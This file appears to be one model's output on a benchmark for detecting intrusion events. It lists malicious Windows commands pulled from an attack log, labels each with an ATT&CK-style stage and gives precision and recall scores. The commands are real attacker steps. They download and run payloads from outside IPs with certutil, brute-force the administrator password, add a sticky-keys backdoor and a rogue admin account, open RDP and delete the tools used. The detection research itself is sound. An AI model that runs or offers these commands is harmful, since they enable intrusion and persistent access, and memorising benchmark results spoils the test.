@@ -1,0 +1,150 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "cmd.exe /c \"taskkill /f /im agent.exe&certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe&cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443\"",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"echo start:f98e6367-e38b-4e53-ba83-c58ede5c85fc\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"cmd /c 'python PhpStudyPoc.py http://121.36.30.176/'\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "cmd.exe /c del /f /q PhpStudyPoc.py",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"echo end:f98e6367-e38b-4e53-ba83-c58ede5c85fc\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"echo start:dbb2f234-101f-4f44-bb97-72263635f506\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "cmd.exe /c WinBrute.exe administrator_pass.txt administrator",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "cmd.exe /c del /f /q WinBrute.exe && del /f /q administrator_pass.txt",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"echo end:dbb2f234-101f-4f44-bb97-72263635f506\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f;netsh advfirewall firewall add rule name=\"Remote Desktop\" dir=in action=allow protocol=TCP localport=3389\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"reg query \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\";REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "reg.exe add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",
+        "stage": "Persistence"
+      },
+      {
+        "command": "netsh.exe advfirewall firewall add rule name=\"Remote Desktop\" dir=in action=allow protocol=TCP localport=3389",
+        "stage": "Persistence"
+      },
+      {
+        "command": "reg.exe query \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\";",
+        "stage": "Discovery"
+      },
+      {
+        "command": "reg.exe ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\" /f",
+        "stage": "Persistence"
+      },
+      {
+        "command": "reg.exe query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\windows\\system32\\sethc.exe\" /f;REG query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "reg.exe ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d C:\\windows\\system32\\sethc.exe /f",
+        "stage": "Persistence"
+      },
+      {
+        "command": "cmd.exe /c \"cmd /c cd /d D:/phpStudy/WWW&net user nbb nb123. /add&net localgroup administrators nbb /add&echo [S]&cd&echo [E]\" 2>&1\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "cmd.exe /c \"cmd /c cd /d D:/phpStudy/WWW&certutil.exe -urlcache -split -f http://111.229.170.12/phpmyadmin/themes/servert.exe C:\\Windows\\ywm.exe&echo [S]&cd&echo [E]\" 2>&1\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://111.229.170.12/phpmyadmin/themes/servert.exe C:\\Windows\\ywm.exe",
+        "stage": "Execution"
+      },
+      {
+        "command": "C:\\Windows\\ywm.exe",
+        "stage": "Persistence"
+      },
+      {
+        "command": "cmd.exe /c \"cmd /c cd /d D:/phpStudy/WWW&C:\\Windows\\ywm.exe&echo [S]&cd&echo [E]\" 2>&1\"",
+        "stage": "Lateral Movement"
+      }
+    ],
+    "narrative": "This attack began with delivering a payload to the victim machine using task killing and downloading files (`Initial Access`). It then set up persistent backdoors, monitored the system, escalated privileges, stole credentials, allowed remote desktop access, and executed additional payloads to further compromise the system. Finally, the attackers gained deeper access by moving laterally across the network.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 46136,
+      "completion_tokens": 5462,
+      "total_tokens": 51598,
+      "wall_clock_s": 61.275,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.36,
+      "recall": 0.75,
+      "f1": 0.48648648648648657,
+      "tp": 9,
+      "fp": 16,
+      "fn": 3
+    },
+    "stage": {
+      "precision": 0.28,
+      "recall": 0.7,
+      "f1": 0.4,
+      "tp": 7,
+      "fp": 18,
+      "fn": 3,
+      "recall_partial": 0.5
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 46136,
+      "completion_tokens": 5462,
+      "total_tokens": 51598,
+      "wall_clock_s": 61.275,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v3_stagedefs",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
